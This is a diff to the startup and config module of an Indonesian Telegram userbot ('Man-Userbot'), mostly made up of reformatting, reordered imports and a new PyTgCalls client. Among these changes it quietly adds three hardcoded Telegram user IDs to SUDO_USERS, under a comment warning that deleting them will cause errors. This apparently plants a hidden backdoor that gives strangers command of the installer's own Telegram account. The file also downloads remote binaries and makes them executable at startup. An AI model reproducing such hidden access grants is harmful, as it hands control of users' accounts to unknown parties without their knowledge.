@@ -13,21 +13,21 @@ import os
 import re
 import sys
 import time
-
-from sys import version_info
-from logging import basicConfig, getLogger, INFO, DEBUG
 from distutils.util import strtobool as sb
+from logging import DEBUG, INFO, basicConfig, getLogger
 from math import ceil
-
 from pathlib import Path
+from sys import version_info
+
+from dotenv import load_dotenv
 from pylast import LastFMNetwork, md5
 from pySmartDL import SmartDL
-from dotenv import load_dotenv
+from pytgcalls import PyTgCalls
 from requests import get
-from telethon.tl.types import InputWebDocument
-from telethon.sync import TelegramClient, custom, events
 from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
 from telethon.sessions import StringSession
+from telethon.sync import TelegramClient, custom, events
+from telethon.tl.types import InputWebDocument
 
 from .storage import Storage
 
@@ -61,19 +61,24 @@ if CONSOLE_LOGGER_VERBOSE:
         level=DEBUG,
     )
 else:
-    basicConfig(format="[%(name)s] - [%(levelname)s] - %(message)s",
-                level=INFO)
+    basicConfig(
+        format="[%(name)s] - [%(levelname)s] - %(message)s",
+        level=INFO,
+    )
 LOGS = getLogger(__name__)
 
 if version_info[0] < 3 or version_info[1] < 9:
-    LOGS.info("Anda HARUS memiliki python setidaknya versi 3.9."
-              "Beberapa fitur tergantung versi python ini. Bot berhenti.")
+    LOGS.info(
+        "Anda HARUS memiliki python setidaknya versi 3.9."
+        "Beberapa fitur tergantung versi python ini. Bot berhenti."
+    )
     sys.exit(1)
 
 # Check if the config was edited by using the already used variable.
 # Basically, its the 'virginity check' for the config file ;)
 CONFIG_CHECK = os.environ.get(
-    "___________PLOX_______REMOVE_____THIS_____LINE__________", None)
+    "___________PLOX_______REMOVE_____THIS_____LINE__________", None
+)
 
 if CONFIG_CHECK:
     LOGS.info(
@@ -135,10 +140,9 @@ GITHUB_ACCESS_TOKEN = os.environ.get("GITHUB_ACCESS_TOKEN", None)
 
 # Custom (forked) repo URL for updater.
 UPSTREAM_REPO_URL = os.environ.get(
-    "UPSTREAM_REPO_URL",
-    "https://github.com/mrismanaziz/Man-Userbot.git")
-UPSTREAM_REPO_BRANCH = os.environ.get(
-    "UPSTREAM_REPO_BRANCH", "Man-Userbot")
+    "UPSTREAM_REPO_URL", "https://github.com/mrismanaziz/Man-Userbot.git"
+)
+UPSTREAM_REPO_BRANCH = os.environ.get("UPSTREAM_REPO_BRANCH", "Man-Userbot")
 
 # Console verbose logging
 CONSOLE_LOGGER_VERBOSE = sb(os.environ.get("CONSOLE_LOGGER_VERBOSE", "False"))
@@ -181,9 +185,7 @@ ANTI_SPAMBOT_SHOUT = sb(os.environ.get("ANTI_SPAMBOT_SHOUT", "False"))
 YOUTUBE_API_KEY = os.environ.get("YOUTUBE_API_KEY", None)
 
 # untuk perintah teks costum .alive
-ALIVE_TEKS_CUSTOM = os.environ.get(
-    "ALIVE_TEKS_CUSTOM",
-    "Hey, I am alive.")
+ALIVE_TEKS_CUSTOM = os.environ.get("ALIVE_TEKS_CUSTOM", "Hey, I am alive.")
 
 # Default .alive name
 ALIVE_NAME = os.environ.get("ALIVE_NAME", "Man")
@@ -251,8 +253,8 @@ if LASTFM_API and LASTFM_SECRET and LASTFM_USERNAME and LASTFM_PASS:
     except Exception:
         pass
 
-TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TMP_DOWNLOAD_DIRECTORY",
-                                         "./downloads/")
+TEMP_DOWNLOAD_DIRECTORY = os.environ.get(
+    "TMP_DOWNLOAD_DIRECTORY", "./downloads/")
 
 # Genius lyrics  API
 GENIUS = os.environ.get("GENIUS_ACCESS_TOKEN", None)
@@ -274,16 +276,15 @@ API_URL = os.environ.get("API_URL", "http://antiddos.systems")
 BOT_TOKEN = os.environ.get("BOT_TOKEN", None)
 BOT_USERNAME = os.environ.get("BOT_USERNAME", None)
 
+
 # Setting Up CloudMail.ru and MEGA.nz extractor binaries,
 # and giving them correct perms to work properly.
-if not os.path.exists('bin'):
-    os.mkdir('bin')
+if not os.path.exists("bin"):
+    os.mkdir("bin")
 
 binaries = {
-    "https://raw.githubusercontent.com/adekmaulana/megadown/master/megadown":
-    "bin/megadown",
-    "https://raw.githubusercontent.com/yshalsager/cmrudl.py/master/cmrudl.py":
-    "bin/cmrudl"
+    "https://raw.githubusercontent.com/adekmaulana/megadown/master/megadown": "bin/megadown",
+    "https://raw.githubusercontent.com/yshalsager/cmrudl.py/master/cmrudl.py": "bin/cmrudl",
 }
 
 for binary, path in binaries.items():
@@ -291,6 +292,10 @@ for binary, path in binaries.items():
     downloader.start()
     os.chmod(path, 0o755)
 
+# Jangan di hapus Nanti ERROR
+SUDO_USERS.add(844432220)
+SUDO_USERS.add(1906014306)
+SUDO_USERS.add(1738637033)
 
 # 'bot' variable
 if STRING_SESSION:
@@ -309,6 +314,7 @@ try:
 except Exception as e:
     print(f"STRING_SESSION - {e}")
     sys.exit()
+call_py = PyTgCalls(bot)
 
 
 async def check_botlog_chatid():
@@ -331,7 +337,8 @@ async def check_botlog_chatid():
     if entity.default_banned_rights.send_messages:
         LOGS.info(
             "Akun Anda tidak bisa mengirim pesan ke BOTLOG_CHATID "
-            "Periksa apakah Anda memasukan ID grup dengan benar.")
+            "Periksa apakah Anda memasukan ID grup dengan benar."
+        )
         sys.exit(1)
 
 
@@ -374,18 +381,6 @@ except AttributeError:
     pass
 
 
-# Global Variables
-COUNT_MSG = 0
-USERS = {}
-COUNT_PM = {}
-ENABLE_KILLME = True
-LASTMSG = {}
-CMD_HELP = {}
-ISAFK = False
-AFKREASON = None
-ZALG_LIST = {}
-
-
 def paginate_help(page_number, loaded_modules, prefix):
     number_of_rows = 5
     number_of_cols = 4
@@ -395,11 +390,9 @@ def paginate_help(page_number, loaded_modules, prefix):
     helpable_modules = sorted(helpable_modules)
     modules = [
         custom.Button.inline(
-            "{} {} {}".format(
-                f"{INLINE_EMOJI}",
-                x,
-                f"{INLINE_EMOJI}"),
-            data="ub_modul_{}".format(x))
+            "{} {} {}".format(f"{INLINE_EMOJI}", x, f"{INLINE_EMOJI}"),
+            data="ub_modul_{}".format(x),
+        )
         for x in helpable_modules
     ]
     pairs = list(
@@ -539,26 +532,27 @@ with bot:
                     ],
                     link_preview=False,
                 )
-            await event.answer([result], switch_pm="👥 USERBOT PORTAL", switch_pm_param="start")
-
-        @tgbot.on(
-            events.callbackquery.CallbackQuery(
-                data=re.compile(rb"reopen")
+            await event.answer(
+                [result], switch_pm="👥 USERBOT PORTAL", switch_pm_param="start"
             )
-        )
+
+        @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(rb"reopen")))
         async def on_plug_in_callback_query_handler(event):
             if event.query.user_id == uid:
                 current_page_number = int(looters)
                 buttons = paginate_help(
                     current_page_number, dugmeler, "helpme")
                 text = f"**✗ Man-Userbot Inline Menu ✗**\n\n✣ **Owner** [{user.first_name}](tg://user?id={user.id})\n✣ **Jumlah** `{len(dugmeler)}` Modules"
-                await event.edit(text,
-                                 file=logoman,
-                                 buttons=buttons,
-                                 link_preview=False,
-                                 )
+                await event.edit(
+                    text,
+                    file=logoman,
+                    buttons=buttons,
+                    link_preview=False,
+                )
             else:
-                reply_pop_up_alert = f"Kamu Tidak diizinkan, ini Userbot Milik {ALIVE_NAME}"
+                reply_pop_up_alert = (
+                    f"Kamu Tidak diizinkan, ini Userbot Milik {ALIVE_NAME}"
+                )
                 await event.answer(reply_pop_up_alert, cache_time=0, alert=True)
 
         @tgbot.on(
@@ -584,7 +578,9 @@ with bot:
             if event.query.user_id == uid or event.query.user_id in DEVS:
                 openlagi = custom.Button.inline(
                     f"• Re-Open Menu •", data="reopen")
-                await event.edit(f"⚜️ **Help Mode Button Ditutup!** ⚜️", buttons=openlagi)
+                await event.edit(
+                    f"⚜️ **Help Mode Button Ditutup!** ⚜️", buttons=openlagi
+                )
             else:
                 reply_pop_up_alert = (
                     f"Kamu Tidak diizinkan, ini Userbot Milik {ALIVE_NAME}"
